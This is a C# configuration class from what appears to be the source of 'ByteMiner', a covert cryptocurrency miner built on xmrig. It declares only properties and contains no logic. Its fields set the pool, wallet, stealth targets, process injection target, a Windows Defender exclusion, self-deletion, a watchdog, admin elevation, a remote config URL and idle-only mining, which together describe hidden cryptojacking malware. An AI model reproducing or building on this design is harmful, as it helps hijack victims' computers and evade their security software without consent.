namespace ByteMiner
{
    public class Config
    {
        public bool nicehash { get;  set; }
        public bool tls { get;  set; }
        public string poolUrl {  get;  set; }
        public string walletAddress { get;  set; }
        public string password { get;  set; }
        public string coin { get;  set; }
        public string ridId { get;  set; }

        public string algo { get; set; }

        public bool isStealthTargetsEnabled { get; set; }
        public string stealthTargets { get; set; }
        public bool isRemoteConfigEnabled { get; set; }
        public string remoteConfigUrl { get; set; }

        public bool isIdleMiningEnabled { get; set; }
        public string idleThreads { get; set; }
        public string activeThreads { get; set; }
        public string idleWaitTime { get; set; }
        public bool isBuildStatic { get; set; }
        public string xmrigUrl { get; set; }
        public int injectionTarget { get; set; }
        public bool WDExclusion { get; set; }
        public bool DisableSleep { get; set; }

        public bool SelfDelete { get; set; }
        public bool fullscreen { get; set; }
        public bool Watchdog { get; set; }
        public bool IsDebug { get; set; }
        public bool RunAsAdmin { get; set; }

        public string InstallPath { get; set; }

        public string MinerService { get; set; }

        public int BaseInstallPath { get; set; }

    }
}